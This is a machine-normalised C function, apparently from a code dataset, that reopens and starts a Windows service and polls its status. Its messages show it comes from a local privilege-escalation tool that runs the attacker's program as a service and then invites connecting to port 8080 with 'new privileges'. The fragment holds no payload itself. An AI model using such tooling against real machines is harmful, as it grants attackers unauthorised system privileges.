
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_3__ {int dwCheckPoint; scalar_t__ dwCurrentState; int dwWaitHint; } ;
typedef TYPE_1__ SERVICE_STATUS_PROCESS ;
typedef int * SC_HANDLE ;
typedef int DWORD ;
typedef scalar_t__ BOOL ;


 scalar_t__ VAR_0 ;
 int FUNC_0 (int *) ;
 int FUNC_1 () ;
 int FUNC_2 () ;
 int * FUNC_3 (int *,char*,int ) ;
 int FUNC_4 (int *,int ,TYPE_1__*,int,int*) ;
 int VAR_1 ;
 int VAR_2 ;
 scalar_t__ VAR_3 ;
 scalar_t__ VAR_4 ;
 int FUNC_5 (int) ;
 int FUNC_6 (int *,int ,int *) ;
 int FUNC_7 (int) ;
 int FUNC_8 (char*,...) ;

DWORD FUNC_9(SC_HANDLE VAR_5, char *VAR_6, BOOL VAR_7) {

 SC_HANDLE VAR_8;
 DWORD VAR_9;
 SERVICE_STATUS_PROCESS VAR_10;
 DWORD VAR_11;

 DWORD VAR_12;
 DWORD VAR_13;
 DWORD VAR_14;

 VAR_8= FUNC_3( VAR_5, VAR_6, VAR_2);

 if (VAR_8==((void*)0)) {
    if (VAR_7) FUNC_8("[-] Unable to reopen service for starting..\n");
    return(-1);
 } else {
    if (VAR_7) FUNC_8("[+] Service Opened. Trying to Start... (wait a few seconds)\n");
 }

 if (!FUNC_6(VAR_8,0,((void*)0))) {
    VAR_9=FUNC_1();
    if (VAR_9==1053) {
        if (VAR_7) {
            FUNC_8("[+] StarteService() Error due to a non service application execution\n");
            FUNC_8("[+] Ignore it. Your application should be executed =)\n");
            if (VAR_0) {
                FUNC_8("[+] Now connect to port 8080 and enjoy your new privileges\n");
            }
        }
    } else {
        if (VAR_7) {
            FUNC_8("[-] Unable to start Service :/\n");
            FUNC_7(VAR_9);
        }
        return(VAR_9);
    }

 } else {
        if (VAR_7) FUNC_8("[+]  Starting Service....\n");
        if (!FUNC_4(
            VAR_8,
            VAR_1,
            &VAR_10,
            sizeof(SERVICE_STATUS_PROCESS),
            &VAR_11) )
        {
            if (VAR_7) FUNC_8("[-] Unable to QueryServiceStatusEx() \n");
            return(-2);
        } else {



            VAR_13 = FUNC_2();
            VAR_12 = VAR_10.dwCheckPoint;
            while (VAR_10.dwCurrentState == VAR_4)
            {
                if (VAR_7) FUNC_8("Wait Time: %i\n",VAR_10.dwWaitHint);
                VAR_14 = VAR_10.dwWaitHint / 10;
                if( VAR_14 < 1000 )
                    VAR_14 = 1000;
                else if ( VAR_14 > 10000 )
                    VAR_14 = 10000;
                FUNC_5( VAR_14 );


                if (!FUNC_4(
                    VAR_8,
                    VAR_1,
                    &VAR_10,
                    sizeof(SERVICE_STATUS_PROCESS),
                    &VAR_11 ) )
                {
                    if (VAR_7) FUNC_8("[-] Unable to QueryServiceStatusEx() \n");
                    return(-2);
                }
                if ( VAR_10.dwCheckPoint > VAR_12 )
                {

                    VAR_13 = FUNC_2();
                    VAR_12 = VAR_10.dwCheckPoint;
                } else {
                    if(FUNC_2()-VAR_13 > VAR_10.dwWaitHint)
                    {

                        if (VAR_7) FUNC_8("el servicio no se ha arrancado...\n");
                        break;
                    }
                }
            }
        }
        FUNC_0(VAR_8);
        if (VAR_10.dwCurrentState == VAR_3)
        {
            if (VAR_7) FUNC_8("[+] StartService SUCCESS.\n");
            return 1;
        }
        else
        {
            if (VAR_7) FUNC_8("\n[-] Service not started. \n");
        }
  }
  return(0);
}
